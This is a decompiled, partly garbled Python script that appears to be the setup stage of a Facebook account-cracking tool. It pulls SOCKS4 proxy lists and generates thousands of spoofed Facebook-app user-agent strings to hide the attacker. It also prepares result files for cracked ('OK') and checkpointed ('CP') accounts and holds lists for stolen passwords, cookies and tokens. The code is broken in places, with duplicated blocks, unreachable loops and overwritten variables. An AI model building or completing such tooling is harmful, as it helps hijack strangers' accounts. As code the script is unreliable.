#Decoded By HARRY-EXE on Github :)

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.panel import Panel
from rich.console import Console as sol
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON = sol()
import os
import platform
import time
import sys
import socket
dic = {
    '1': 'JANUARY',
    '2': 'FEBRUARY',
    '3': 'MARCH',
    '4': 'APRIL',
    '5': 'MAY',
    '6': 'JUNE',
    '7': 'JULY',
    '8': 'AUGUST',
    '9': 'SEPTEMBER',
    '10': 'OCTOBER',
    '11': 'NOVEMBER',
    '12': 'DECEMBER' }
dic2 = {
    '01': 'JANUARY',
    '02': 'FEBRUARY',
    '03': 'MARCH',
    '04': 'APRIL',
    '05': 'MAY',
    '06': 'JUNE',
    '07': 'JULY',
    '08': 'AUGUST',
    '09': 'SEPTEMBER',
    '10': 'OCTOBER',
    '11': 'NOVEMBER',
    '12': 'DECEMBER' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
date = str(tgl) + '/' + str(bln) + '/' + str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx - 12
    tag = 'PM'
a = ltx
tag = 'AM'
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
ugent = []
import requests

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    with open('.prox.txt', 'w') as f:
        f.write(prox)
except requests.RequestException as e:
    print("Error fetching proxies:", e)
except IOError as e:
    print("Error writing to file:", e)

prox = open('.prox.txt', 'r').read().splitlines()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
import requests

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    with open('.prox.txt', 'w') as f:
        f.write(prox)
except requests.RequestException as e:
    print("Error fetching proxies:", e)
except IOError as e:
    print("Error writing to file:", e)

prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.\x1b[38;5;46m.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = ' en-us; GT-'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}\x1b[38;5;46m.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    for x in range(10):
        a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b = random.randrange(100, 9999)
        c = random.randrange(100, 9999)
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        h = random.randrange(1, 9)
        i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j = random.randrange(1, 9)
        k = random.randrange(1, 9)
        l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uak = f'''{a}{b}/{c}{d}{e}{f}{g}\x1b[38;5;46m{i}{j}.{k} {l}'''
        
import requests
import re

def uaku():
    try:
        # Fetch user-agent strings from the URL
        response = requests.get('https://raw.githubusercontent.com/cvandeplas/pystemon/master/user-agents.txt')
        if response.status_code == 200:
            # Write the fetched user-agent strings to a local file
            with open('user-agents.txt', 'w') as ua_file:
                ua_file.write(response.text)
    except requests.RequestException as e:
        print("Error fetching user-agent strings:", e)


        for z in range(200):
            versi_android = str(random.randint(4, 12)) + '.0.1'
            rr = random.randint
            rc = random.choice
            xio = str(random.randint(4, 12)) + '.0.0'
            android = str(random.randint(4, 12))
            versi_chrome = str(random.randint(111, 555)) + '.0.0.' + str(random.randint(10, 30)) + '.' + str(random.randint(10, 150))
            device_oppo = random.choice([
                'CPH1723',
                'CPH1901',
                'CPH1920',
                'CPH1933',
                'CPH1937',
                'CPH1937',
                'CPH1945',
                'CPH1951',
                'CPH1969',
                'CPH1979',
                'CPH1983',
                'CPH2005',
                'CPH2023',
                'CPH2083',
                'CPH2003',
                'CPH2004',
                'CPH2269',
                'vivo 1917',
                'vivo 1915',
                'vivo 1911',
                'vivo 1933',
                'vivo 1912',
                'vivo 1920',
                'vivo 1921',
                'vivo 1910',
                'vivo 1927',
                'vivo 1913',
                'vivo 1923',
                'vivo 1926',
                'vivo 1928',
                'vivo 1931',
                'vivo 1935',
                'SM-G975F',
                'SM-G532G',
                'SM-N975F',
                'SM-G988U',
                'SM-G977U',
                'SM-A705FN',
                'SM-A515U1',
                'SM-G955F',
                'SM-A750G',
                'SM-N960F',
                'SM-G960U',
                'SM-J600F',
                'SM-A908B',
                'SM-A705GM',
                'SM-G970U',
                'SM-A307FN',
                'SM-G965U1',
                'SM-A217F',
                'SM-G986B',
                'SM-A207M',
                'SM-A515W',
                'SM-A505G',
                'SM-A315G',
                'SM-A507FN',
                'SM-A505U1',
                'SM-G977T',
                'SM-A025G',
                'SM-J320F',
                'SM-A715W',
                'SM-A908N',
                'SM-A205F',
                'SM-G988B',
                'SM-N986B',
                'SM-A715F',
                'SM-A515F',
                'SM-G965F',
                'SM-G960F',
                'SM-A505F',
                'SM-A207F',
                'SM-A307G',
                'SM-G970F',
                'SM-A107F',
                'SM-G935F',
                'SM-G935A',
                'SM-A310F',
                'SM-J320FN',
                'Mi 11 Lite 5G  stable',
                'Mi 10T Pro',
                'Mi 11 Lite',
                'MI 8 Lite',
                'MI 5X MIUI',
                'Mi 11i',
                'Xiaomi 11 Lite 5G NE',
                'Xiaomi 12 Lite',
                'Mi 9T Pro',
                'M2004J19PI MIUI',
                'Xiaomi 12S Ultra',
                'MIX 4',
                'Mi 11i',
                'Mi Note 10',
                'Mi 9 SE',
                'Mi 8 SE',
                'Mi 10 SE',
                'MI MAX 3',
                'Xiaomi 12T',
                'MIX 2S',
                'MI 8 SE',
                'Mi A3',
                'Mi A4',
                'MI 6',
                'MI MAX 2',
                'MI MAX 3',
                'Xiaomi 12S Ultra ',
                'Xiaomi 12SE Ultra ',
                'Mi 11i',
                'Mi 12i',
                'Mi 10 Lite 5G',
                'Mi 11 Lite 5G',
                'Mi 12 Lite 5G',
                'Mi 10 Lite 4G',
                'Mi 10 Lite 4G',
                'E6653',
                ' G8231',
                'C6603',
                ' D6503',
                'SO-05F',
                'SGP612',
                '802SO',
                'J9110',
                'SOV40',
                'SO-51A',
                'XQ-AT51',
                ' SOG01',
                'SO51Aa',
                'XQ-AT42',
                'SO-51B',
                'XQ-BC52',
                'XQ-BC62',
                'XQ-BC72',
                'SOG03',
                'J9150',
                'I4113',
                'I3113',
                'I3123',
                'I3113',
                '901SO',
                'J3273',
                'XQ-CC72',
                'XQ-BT44',
                'SO-41B',
                ' C2304',
                'E5506',
                'G3311',
                ' C1905',
                'D5322',
                'Pixel 6a',
                'Pixel 4',
                'Pixel 5',
                'Pixel 4 XL',
                'Pixel 6',
                'Pixel 6 Pro',
                'Pixel 7 Pro',
                'Pixel 4a',
                'Pixel C',
                'Pixel 5a',
                'Pixel 2 XL',
                'Pixel 2',
                'Pixel Slate',
                'Google Pixelbook Go',
                'Google Pixelbook Go',
                'Pixel XL',
                'Pixel 3a',
                'RMX1831',
                'RMX1911',
                'RMX1971',
                'RMX2030',
                'RMX2076',
                'RMX2081',
                'RMX2151',
                'RMX2176',
                'RMX2185',
                'RMX2193',
                'RMX2194',
                'RMX2195',
                'RMX3061',
                'RMX3017',
                'RMX3042',
                'RMX1231'])
            device_vivo = random.choice([
                'vivo 1917',
                'vivo 1915',
                'vivo 1911',
                'vivo 1933',
                'vivo 1912',
                'vivo 1920',
                'vivo 1921',
                'vivo 1910',
                'vivo 1927',
                'vivo 1913',
                'vivo 1923',
                'vivo 1926',
                'vivo 1928',
                'vivo 1931',
                'vivo 1935'])
            device_samsung = random.choice([
                'CPH1723',
                'CPH1901',
                'CPH1920',
                'CPH1933',
                'CPH1937',
                'CPH1937',
                'CPH1945',
                'CPH1951',
                'CPH1969',
                'CPH1979',
                'CPH1983',
                'CPH2005',
                'CPH2023',
                'CPH2083',
                'CPH2003',
                'CPH2004',
                'CPH2269',
                'vivo 1917',
                'vivo 1915',
                'vivo 1911',
                'vivo 1933',
                'vivo 1912',
                'vivo 1920',
                'vivo 1921',
                'vivo 1910',
                'vivo 1927',
                'vivo 1913',
                'vivo 1923',
                'vivo 1926',
                'vivo 1928',
                'vivo 1931',
                'vivo 1935',
                'SM-G975F',
                'SM-G532G',
                'SM-N975F',
                'SM-G988U',
                'SM-G977U',
                'SM-A705FN',
                'SM-A515U1',
                'SM-G955F',
                'SM-A750G',
                'SM-N960F',
                'SM-G960U',
                'SM-J600F',
                'SM-A908B',
                'SM-A705GM',
                'SM-G970U',
                'SM-A307FN',
                'SM-G965U1',
                'SM-A217F',
                'SM-G986B',
                'SM-A207M',
                'SM-A515W',
                'SM-A505G',
                'SM-A315G',
                'SM-A507FN',
                'SM-A505U1',
                'SM-G977T',
                'SM-A025G',
                'SM-J320F',
                'SM-A715W',
                'SM-A908N',
                'SM-A205F',
                'SM-G988B',
                'SM-N986B',
                'SM-A715F',
                'SM-A515F',
                'SM-G965F',
                'SM-G960F',
                'SM-A505F',
                'SM-A207F',
                'SM-A307G',
                'SM-G970F',
                'SM-A107F',
                'SM-G935F',
                'SM-G935A',
                'SM-A310F',
                'SM-J320FN',
                'Mi 11 Lite 5G  stable',
                'Mi 10T Pro',
                'Mi 11 Lite',
                'MI 8 Lite',
                'MI 5X MIUI',
                'Mi 11i',
                'Xiaomi 11 Lite 5G NE',
                'Xiaomi 12 Lite',
                'Mi 9T Pro',
                'M2004J19PI MIUI',
                'Xiaomi 12S Ultra',
                'MIX 4',
                'Mi 11i',
                'Mi Note 10',
                'Mi 9 SE',
                'Mi 8 SE',
                'Mi 10 SE',
                'MI MAX 3',
                'Xiaomi 12T',
                'MIX 2S',
                'MI 8 SE',
                'Mi A3',
                'Mi A4',
                'MI 6',
                'MI MAX 2',
                'MI MAX 3',
                'Xiaomi 12S Ultra ',
                'Xiaomi 12SE Ultra ',
                'Mi 11i',
                'Mi 12i',
                'Mi 10 Lite 5G',
                'Mi 11 Lite 5G',
                'Mi 12 Lite 5G',
                'Mi 10 Lite 4G',
                'Mi 10 Lite 4G',
                'E6653',
                ' G8231',
                'C6603',
                ' D6503',
                'SO-05F',
                'SGP612',
                '802SO',
                'J9110',
                'SOV40',
                'SO-51A',
                'XQ-AT51',
                ' SOG01',
                'SO51Aa',
                'XQ-AT42',
                'SO-51B',
                'XQ-BC52',
                'XQ-BC62',
                'XQ-BC72',
                'SOG03',
                'J9150',
                'I4113',
                'I3113',
                'I3123',
                'I3113',
                '901SO',
                'J3273',
                'XQ-CC72',
                'XQ-BT44',
                'SO-41B',
                ' C2304',
                'E5506',
                'G3311',
                ' C1905',
                'D5322',
                'Pixel 6a',
                'Pixel 4',
                'Pixel 5',
                'Pixel 4 XL',
                'Pixel 6',
                'Pixel 6 Pro',
                'Pixel 7 Pro',
                'Pixel 4a',
                'Pixel C',
                'Pixel 5a',
                'Pixel 2 XL',
                'Pixel 2',
                'Pixel Slate',
                'Google Pixelbook Go',
                'Google Pixelbook Go',
                'Pixel XL',
                'Pixel 3a',
                'RMX1831',
                'RMX1911',
                'RMX1971',
                'RMX2030',
                'RMX2076',
                'RMX2081',
                'RMX2151',
                'RMX2176',
                'RMX2185',
                'RMX2193',
                'RMX2194',
                'RMX2195',
                'RMX3061',
                'RMX3017',
                'RMX3042',
                'RMX1231'])
            device_xiaomi = random.choice([
                'Mi 11 Lite 5G  stable',
                'Mi 10T Pro',
                'Mi 11 Lite',
                'MI 8 Lite',
                'MI 5X MIUI',
                'Mi 11i',
                'Xiaomi 11 Lite 5G NE',
                'Xiaomi 12 Lite',
                'Mi 9T Pro',
                'M2004J19PI MIUI',
                'Xiaomi 12S Ultra',
                'MIX 4',
                'Mi 11i',
                'Mi Note 10',
                'Mi 9 SE',
                'Mi 8 SE',
                'Mi 10 SE',
                'MI MAX 3',
                'Xiaomi 12T',
                'MIX 2S',
                'MI 8 SE',
                'Mi A3',
                'Mi A4',
                'MI 6',
                'MI MAX 2',
                'MI MAX 3',
                'Xiaomi 12S Ultra ',
                'Xiaomi 12SE Ultra ',
                'Mi 11i',
                'Mi 12i',
                'Mi 10 Lite 5G',
                'Mi 11 Lite 5G',
                'Mi 12 Lite 5G',
                'Mi 10 Lite 4G',
                'Mi 10 Lite 4G'])
            device_sony = random.choice([
                'E6653',
                ' G8231',
                'C6603',
                ' D6503',
                'SO-05F',
                'SGP612',
                '802SO',
                'J9110',
                'SOV40',
                'SO-51A',
                'XQ-AT51',
                ' SOG01',
                'SO51Aa',
                'XQ-AT42',
                'SO-51B',
                'XQ-BC52',
                'XQ-BC62',
                'XQ-BC72',
                'SOG03',
                'J9150',
                'I4113',
                'I3113',
                'I3123',
                'I3113',
                '901SO',
                'J3273',
                'XQ-CC72',
                'XQ-BT44',
                'SO-41B',
                ' C2304',
                'E5506',
                'G3311',
                ' C1905',
                'D5322'])
            device_google = random.choice([
                'Pixel 6a',
                'Pixel 4',
                'Pixel 5',
                'Pixel 4 XL',
                'Pixel 6',
                'Pixel 6 Pro',
                'Pixel 7 Pro',
                'Pixel 4a',
                'Pixel C',
                'Pixel 5a',
                'Pixel 2 XL',
                'Pixel 2',
                'Pixel Slate',
                'Google Pixelbook Go',
                'Google Pixelbook Go',
                'Pixel XL',
                'Pixel 3a'])
            device_realme = random.choice([
                'RMX1831',
                'RMX1911',
                'RMX1971',
                'RMX2030',
                'RMX2076',
                'RMX2081',
                'RMX2151',
                'RMX2176',
                'RMX2185',
                'RMX2193',
                'RMX2194',
                'RMX2195',
                'RMX3061',
                'RMX3017',
                'RMX3042',
                'RMX1231'])
            h_sony = random.choice([
                'A',
                'B',
                'C'])
            dev = device_oppo.split(' Build/')[0]
            density = random.choice([
                '{density=3.0,width=720,height=1280};FB_FW/1;]',
                '{density=3.0,width=1080,height=1920};FB_FW/1;]',
                '{density=3.0,width=1080,height=1920};FB_FW/1;]',
                '{density=2.75,width=1080,height=2028};FB_FW/1;]'])
            jkj = str(random.randint(11111111, 99999999))
            jka = str(random.randint(200600, 200999))
            jkb = str(random.randint(4, 13))
            jkc = str(random.randint(20000000, 99999999))
            opk = random.choice([
                'com.facebook.katana',
                'com.facebook.adsmanager',
                'com.facebook.lite',
                'com.facebook.orca',
                'com.facebook.mlite'])
            oph = random.choice([
                'Katana-Android',
                'Adsmanager-Android',
                'Facebook.lite-Android',
                'Orca-Android',
                'Facebook.mlite-Android'])
            mco = random.choice([
                'en_GB',
                'en_US',
                'es_MX',
                'th_TH',
                'pl_PL'])
            az = ('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z')
            build = f'''{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}'''
            versi = random.choice([
                '10_0_2',
                '10_1_1',
                '10_2',
                '10_2_1',
                '10_3_1',
                '10_3_2',
                '10_3_3'])
            verchrome = random.choice([
                '602.1.50',
                '602.2.14',
                '602.3.12',
                '602.4.6',
                '603.1.30',
                '603.2.4',
                '603.3.8',
                '601.1.46'])
            mob = random.choice([
                '14A456',
                '14B100',
                '14C92',
                '14D27',
                '14E304',
                '14F89',
                '14G60',
                '13C75',
                '13D15',
                '13E233',
                '13E238',
                '13F69',
                '13G34',
                '13G36'])
            ua_v = f'''Mozilla/5.0 (Linux; Android {xio}; {device_vivo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 100))}.0.{str(rr(3400, 5999))}.{str(rr(100, 150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(200, 700))}.0.0.{str(rr(10, 30))}.{str(rr(30, 150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(111111111, 999999999))};FBCR/Indosat;FBMF/vivo;FBBD/vivo;FBDV/{device_vivo};FBSV/{versi_android};FBOP/16]'''
            ua_s = f'''Mozilla/5.0 (Linux; Android {android}; {device_samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 200))}.0.{str(rr(5000, 5999))}.{str(rr(10, 100))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(700, 999))}.0.0.{str(rr(100, 200))}.{str(rr(200, 350))};]'''
            ua_o = f'''Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 100))}.0.{str(rr(4000, 4999))}.{str(rr(100, 150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100, 700))}.0.0.{str(rr(10, 50))}.{str(rr(30, 150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(111111111, 999999999))};FBCR/Indosat;FBMF/oppo;FBBD/oppo;FBDV/{device_oppo};FBSV/{versi_android};FBOP/18]'''
            ua_r = f'''Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 100))}.0.{str(rr(4400, 4999))}.{str(rr(100, 150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100, 700))}.0.0.{str(rr(10, 50))}.{str(rr(30, 150))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(111111111, 999999999))};FBCR/Indosat;FBMF/Realme;FBBD/Realme;FBDV/{device_realme};FBSV/{versi_android};FBOP/19]'''
            ua_d = f'''Mozilla/5.0 (Linux; Android {android}; {device_samsung} Build/TP1A.{str(rr(220000, 229999))}.0{str(rr(1, 30))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100, 130))}.0.{str(rr(5000, 5999))}.{str(rr(100, 150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(90, 600))}.0.0.{str(rr(1, 30))}.{str(rr(100, 150))};]'''
            ua_x = f'''Mozilla/5.0 (Linux; Android {android}; {device_xiaomi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 200))}.0.{str(rr(4000, 4999))}.{str(rr(100, 150))} Mobile Safari/537.36 [FBAN/FB;FBAV/{str(rr(300, 600))}.0.0.{str(rr(10, 90))}.{str(rr(100, 150))};FBBV/{str(rr(200000000, 299999999))};WV;FBDM/''' + '{density=3.0,width=1080,height=2133};FBLC/en_US;FBRV/250292151;]'
            ua = str(rc([
                ua_d,
                ua_s]))
            if ua_s in ugent:
                pass
            ugent.append(ua_s)
            for z in range(200):
                versi_android = str(random.randint(4, 12)) + '.0.0'
                versi_chrome = str(random.randint(300, 325)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
                device = random.choice([
                    'CPH1723',
                    'CPH1901',
                    'CPH1920',
                    'CPH1933',
                    'CPH1937',
                    'CPH1937',
                    'CPH1945',
                    'CPH1951',
                    'CPH1969',
                    'CPH1979',
                    'CPH1983',
                    'CPH2005',
                    'CPH2023',
                    'CPH2083',
                    'CPH2003',
                    'CPH2004',
                    'CPH2269',
                    'vivo 1917',
                    'vivo 1915',
                    'vivo 1911',
                    'vivo 1933',
                    'vivo 1912',
                    'vivo 1920',
                    'vivo 1921',
                    'vivo 1910',
                    'vivo 1927',
                    'vivo 1913',
                    'vivo 1923',
                    'vivo 1926',
                    'vivo 1928',
                    'vivo 1931',
                    'vivo 1935',
                    'SM-G975F',
                    'SM-G532G',
                    'SM-N975F',
                    'SM-G988U',
                    'SM-G977U',
                    'SM-A705FN',
                    'SM-A515U1',
                    'SM-G955F',
                    'SM-A750G',
                    'SM-N960F',
                    'SM-G960U',
                    'SM-J600F',
                    'SM-A908B',
                    'SM-A705GM',
                    'SM-G970U',
                    'SM-A307FN',
                    'SM-G965U1',
                    'SM-A217F',
                    'SM-G986B',
                    'SM-A207M',
                    'SM-A515W',
                    'SM-A505G',
                    'SM-A315G',
                    'SM-A507FN',
                    'SM-A505U1',
                    'SM-G977T',
                    'SM-A025G',
                    'SM-J320F',
                    'SM-A715W',
                    'SM-A908N',
                    'SM-A205F',
                    'SM-G988B',
                    'SM-N986B',
                    'SM-A715F',
                    'SM-A515F',
                    'SM-G965F',
                    'SM-G960F',
                    'SM-A505F',
                    'SM-A207F',
                    'SM-A307G',
                    'SM-G970F',
                    'SM-A107F',
                    'SM-G935F',
                    'SM-G935A',
                    'SM-A310F',
                    'SM-J320FN',
                    'Mi 11 Lite 5G  stable',
                    'Mi 10T Pro',
                    'Mi 11 Lite',
                    'MI 8 Lite',
                    'MI 5X MIUI',
                    'Mi 11i',
                    'Xiaomi 11 Lite 5G NE',
                    'Xiaomi 12 Lite',
                    'Mi 9T Pro',
                    'M2004J19PI MIUI',
                    'Xiaomi 12S Ultra',
                    'MIX 4',
                    'Mi 11i',
                    'Mi Note 10',
                    'Mi 9 SE',
                    'Mi 8 SE',
                    'Mi 10 SE',
                    'MI MAX 3',
                    'Xiaomi 12T',
                    'MIX 2S',
                    'MI 8 SE',
                    'Mi A3',
                    'Mi A4',
                    'MI 6',
                    'MI MAX 2',
                    'MI MAX 3',
                    'Xiaomi 12S Ultra ',
                    'Xiaomi 12SE Ultra ',
                    'Mi 11i',
                    'Mi 12i',
                    'Mi 10 Lite 5G',
                    'Mi 11 Lite 5G',
                    'Mi 12 Lite 5G',
                    'Mi 10 Lite 4G',
                    'Mi 10 Lite 4G',
                    'E6653',
                    ' G8231',
                    'C6603',
                    ' D6503',
                    'SO-05F',
                    'SGP612',
                    '802SO',
                    'J9110',
                    'SOV40',
                    'SO-51A',
                    'XQ-AT51',
                    ' SOG01',
                    'SO51Aa',
                    'XQ-AT42',
                    'SO-51B',
                    'XQ-BC52',
                    'XQ-BC62',
                    'XQ-BC72',
                    'SOG03',
                    'J9150',
                    'I4113',
                    'I3113',
                    'I3123',
                    'I3113',
                    '901SO',
                    'J3273',
                    'XQ-CC72',
                    'XQ-BT44',
                    'SO-41B',
                    ' C2304',
                    'E5506',
                    'G3311',
                    ' C1905',
                    'D5322',
                    'Pixel 6a',
                    'Pixel 4',
                    'Pixel 5',
                    'Pixel 4 XL',
                    'Pixel 6',
                    'Pixel 6 Pro',
                    'Pixel 7 Pro',
                    'Pixel 4a',
                    'Pixel C',
                    'Pixel 5a',
                    'Pixel 2 XL',
                    'Pixel 2',
                    'Pixel Slate',
                    'Google Pixelbook Go',
                    'Google Pixelbook Go',
                    'Pixel XL',
                    'Pixel 3a',
                    'RMX1831',
                    'RMX1911',
                    'RMX1971',
                    'RMX2030',
                    'RMX2076',
                    'RMX2081',
                    'RMX2151',
                    'RMX2176',
                    'RMX2185',
                    'RMX2193',
                    'RMX2194',
                    'RMX2195',
                    'RMX3061',
                    'RMX3017',
                    'RMX3042',
                    'RMX1231'])
                dev = device.split(' Build/')[0]
                az = ('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z')
                build = f'''{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}'''
                versi = random.choice([
                    '10_0_2',
                    '10_1_1',
                    '10_2',
                    '10_2_1',
                    '10_3_1',
                    '10_3_2',
                    '10_3_3'])
                verchrome = random.choice([
                    '602.1.50',
                    '602.2.14',
                    '602.3.12',
                    '602.4.6',
                    '603.1.30',
                    '603.2.4',
                    '603.3.8',
                    '601.1.46'])
                mob = random.choice([
                    '14A456',
                    '14B100',
                    '14C92',
                    '14D27',
                    '14E304',
                    '14F89',
                    '14G60',
                    '13C75',
                    '13D15',
                    '13E233',
                    '13E238',
                    '13F69',
                    '13G34',
                    '13G36'])
                ua = f'''UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; id; CPH2387) U2/1.0.0 UCBrowser/9.9.0.543 Mobile [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/193013937;FBDM/''' + '{density=2.625,width=1080,height=1794};' + f'''FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android};FBBK/1;FBOP/1;FBCA/arm64-v8a:;'''
                if ua in ugent:
                    pass
                ugent.append(ua)
                (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
                cokbrut = []
                pwpluss = []
                pwnya = []
                user = []
                logincookie = []
                apk_ck = []
                P = '\x1b[1;97m'
                M = '\x1b[1;91m'
                H = '\x1b[1;92m'
                K = '\x1b[1;93m'
                B = '\x1b[1;94m'
                U = '\x1b[1;95m'
                O = '\x1b[1;96m'
                N = '\x1b[0m'
                Z = '\x1b[1;30m'
                sir = '\x1b[41m\x1b[1;97m'
                x = '\x1b[m'
                m = '\x1b[1;91m'
                k = '\x1b[93m'
                h = '\x1b[1;92m'
                hh = '\x1b[32m'
                u = '\x1b[95m'
                kk = '\x1b[33m'
                b = '\x1b[1;96m'
                p = '\x1b[0;34m'
                asu = random.choice([
                    m,
                    k,
                    h,
                    u,
                    b])
                A = '\x1b[1;97m'
                R = '\x1b[38;5;196m'
                Y = '\x1b[1;33m'
                G = '\x1b[38;5;48m'
                B = '\x1b[38;5;8m'
                G1 = '\x1b[38;5;46m'
                G2 = '\x1b[38;5;47m'
                G3 = '\x1b[38;5;48m'
                G4 = '\x1b[38;5;49m'
                G5 = '\x1b[38;5;50m'
                X = '\x1b[1;34m'
                X1 = '\x1b[38;5;14m'
                X2 = '\x1b[38;5;123m'
                X3 = '\x1b[38;5;122m'
                X4 = '\x1b[38;5;86m'
                X5 = '\x1b[38;5;121m'
                S = '\x1b[1;96m'
                M = '\x1b[38;5;205m'
                P = '\x1b[1;36m'
                O = '\x1b[1;35m'
                



def restart():
    os.system(f'''python {__file__}''')
    os.system('exit')

def animation(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def alvino_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)


def back():
    login()


def contact():
    os.system('xdg-open https://facebook.com/profile.php?id=100000361707778&mibextid=ZbWKwL/')
    back()


def linex():
    print('\x1b[37m------------------------------------------------------------')


def cls():
    os.system('clear')
    banner()
    info()

response = requests.get('https://api.ipify.org?format=json')
ipadd = response.json()['ip']

def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

ses = requests.Session()
reset = '[/]'
IP = requests.get('http://ip-api.com/json/').json()['query']
negara = requests.get('http://ip-api.com/json/').json()['country']
datt = []
sim = requests.get('http://ip-api.com/json/').json()['isp']
ip = get_ip()

def soon():
    linex()
